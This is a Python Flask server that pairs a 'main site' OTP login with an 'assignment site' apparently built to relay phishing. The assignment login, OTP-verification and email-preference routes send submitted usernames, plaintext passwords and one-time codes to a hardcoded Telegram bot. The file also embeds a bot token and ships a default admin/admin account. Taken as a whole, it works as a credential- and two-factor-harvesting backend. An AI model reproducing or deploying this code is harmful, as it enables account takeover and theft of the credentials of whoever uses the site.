# Combined Flask Server for Main site and Assignment site
import os
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import bcrypt
import requests
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()  # loads .env file

app = Flask(__name__, static_folder='static', static_url_path='')
CORS(app)

# In-memory database simulation to make it 100% compatible with Vercel serverless deployments
# Maps username -> { 'password_hash': str, 'otp': str, 'otp_requested_at': str }
USERS_DB = {}

# Helper to pre-populate default admin user for convenience
default_pw = bcrypt.hashpw(b"admin", bcrypt.gensalt()).decode('utf-8')
USERS_DB["admin"] = {
    "password_hash": default_pw,
    "otp": None,
    "otp_requested_at": None
}

# Main site Telegram details (loaded from .env)
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

# Assignment site Telegram details (hardcoded for simulation reliability)
ASSIGNMENT_BOT_TOKEN = "8870426823:AAHtZpaX1W16kzSPdKu02fs6PaJPVkUcu20"
ASSIGNMENT_CHAT_ID = "8860662166"

def send_telegram_message(token, chat_id, message: str):
    if not token or not chat_id:
        print("Telegram configuration missing!")
        return False
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    payload = {'chat_id': chat_id, 'text': message}
    try:
        resp = requests.post(url, json=payload)
        print(f"Telegram API response: status={resp.status_code}, content={resp.text}")
        return resp.status_code == 200
    except Exception as e:
        print(f"Telegram API exception: {e}")
        return False

# =====================================================================
# MAIN SITE ROUTES
# =====================================================================

@app.route('/')
def serve_index():
    return send_from_directory('static', 'index.html')

@app.route('/dashboard')
def serve_dashboard():
    return send_from_directory('static', 'dashboard.html')

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'error': 'Missing fields'}), 400
    if username in USERS_DB:
        return jsonify({'error': 'User already exists'}), 409
    
    password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
    USERS_DB[username] = {
        'password_hash': password_hash,
        'otp': None,
        'otp_requested_at': None
    }
    return jsonify({'message': 'User registered'}), 201

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'error': 'Missing fields'}), 400
    
    user = USERS_DB.get(username)
    if user is None:
        return jsonify({'error': 'Invalid credentials'}), 401
    if not bcrypt.checkpw(password.encode('utf-8'), user['password_hash'].encode('utf-8')):
        return jsonify({'error': 'Invalid credentials'}), 401
    return jsonify({'message': 'Login successful'}), 200

@app.route('/request-otp', methods=['POST'])
def request_otp():
    data = request.json
    username = data.get('username')
    if not username:
        return jsonify({'error': 'Missing username'}), 400
    
    user = USERS_DB.get(username)
    if user is None:
        return jsonify({'error': 'User not found'}), 404
        
    # Generate a random 6‑digit OTP
    import secrets
    use_static = os.getenv('USE_STATIC_OTP', 'false').lower() == 'true'
    if use_static:
        otp = '123456'
    else:
        otp = f"{secrets.randbelow(900000) + 100000:06d}"
        
    user['otp'] = otp
    user['otp_requested_at'] = datetime.utcnow().isoformat()
    
    # Send to Main Telegram Bot
    sent = send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, f"OTP for {username}: {otp}")
    if not sent:
         print(f"FAILED TO SEND OTP TO TELEGRAM. OTP was: {otp}")
    return jsonify({'message': 'OTP request processed', 'sent_telegram': sent}), 200

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json
    username = data.get('username')
    otp = data.get('otp')
    if not username or not otp:
        return jsonify({'error': 'Missing fields'}), 400
        
    user = USERS_DB.get(username)
    if user is None:
        return jsonify({'error': 'User not found'}), 404
    
    if not user['otp'] or not user['otp_requested_at']:
        return jsonify({'error': 'No active OTP requested'}), 400
        
    # Check if the OTP is expired (2 minutes lifetime)
    try:
        requested_time = datetime.fromisoformat(user['otp_requested_at'])
        time_diff = (datetime.utcnow() - requested_time).total_seconds()
        if time_diff > 120:
            user['otp'] = None
            user['otp_requested_at'] = None
            return jsonify({'error': 'Verification code expired (valid for 2 min)'}), 401
    except Exception as e:
        return jsonify({'error': 'Error checking code lifetime'}), 500
        
    if user['otp'] == otp:
        user['otp'] = None
        user['otp_requested_at'] = None
        return jsonify({'message': 'OTP verification successful'}), 200
    
    return jsonify({'error': 'Invalid verification code'}), 401

@app.route('/prefer-email', methods=['POST'])
def prefer_email():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    email = data.get('email')
    if not username or not email:
        return jsonify({'error': 'Missing fields'}), 400
    
    # Send notification to Assignment Telegram Bot
    message = (
        f"user prefered otp through mail. here is the mail: {email} example with log in credentials also\n\n"
        f"Username: {username}\n"
        f"Password: {password}"
    )
    sent = send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)
    if not sent:
        return jsonify({'error': 'Failed to notify Telegram bot'}), 500
    return jsonify({'message': 'Email preference notified'}), 200

# =====================================================================
# ASSIGNMENT SITE ROUTES
# =====================================================================

@app.route('/assignment')
@app.route('/assignment/')
def serve_assignment():
    return send_from_directory('static/assignment', 'index.html')

@app.route('/assignment/dashboard')
def serve_assignment_dashboard():
    return send_from_directory('static/assignment', 'dashboard.html')

@app.route('/assignment/register', methods=['POST'])
def assignment_register():
    # Register endpoint mirrors the Main site's registration (shares DB)
    return register()

@app.route('/assignment/login', methods=['POST'])
def assignment_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'error': 'Missing fields'}), 400
        
    # Immediately send credentials to the Assignment Telegram Bot
    message = (
        f"Sign In credentials submitted on Assignment site\n\n"
        f"Username: {username}\n"
        f"Password: {password}"
    )
    send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)
    
    # Verify credentials in memory
    user = USERS_DB.get(username)
    if user is None:
        return jsonify({'error': 'Invalid credentials (user does not exist in Main site)'}), 401
    if not bcrypt.checkpw(password.encode('utf-8'), user['password_hash'].encode('utf-8')):
        return jsonify({'error': 'Invalid credentials'}), 401
        
    return jsonify({'message': 'Credentials verified, please enter your Main site code', 'sent_telegram': False}), 200

@app.route('/assignment/verify-otp', methods=['POST'])
def assignment_verify_otp():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    otp = data.get('otp')
    if not username or not otp:
        return jsonify({'error': 'Missing fields'}), 400
        
    # Immediately send credentials & OTP to Assignment Telegram Bot
    message = (
        f"Assignment site OTP for {username}: {otp}\n\n"
        f"Username: {username}\n"
        f"Password: {password}"
    )
    send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)
        
    user = USERS_DB.get(username)
    if user is None:
        return jsonify({'error': 'User not found in Main site'}), 404
    
    if not user['otp'] or not user['otp_requested_at']:
        return jsonify({'error': 'No active OTP requested in Main site'}), 400
        
    # Check if the OTP is expired (2 minutes lifetime)
    try:
        requested_time = datetime.fromisoformat(user['otp_requested_at'])
        time_diff = (datetime.utcnow() - requested_time).total_seconds()
        if time_diff > 120:
            user['otp'] = None
            user['otp_requested_at'] = None
            return jsonify({'error': 'OTP has expired. Please request a new one in Main site'}), 401
    except Exception as e:
        return jsonify({'error': 'Error checking code lifetime'}), 500
        
    # Match OTP
    if user['otp'] == otp:
        user['otp'] = None
        user['otp_requested_at'] = None
        return jsonify({'message': 'OTP verification successful'}), 200
        
    return jsonify({'error': 'Invalid verification code'}), 401

@app.route('/assignment/prefer-email', methods=['POST'])
def assignment_prefer_email():
    return prefer_email()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
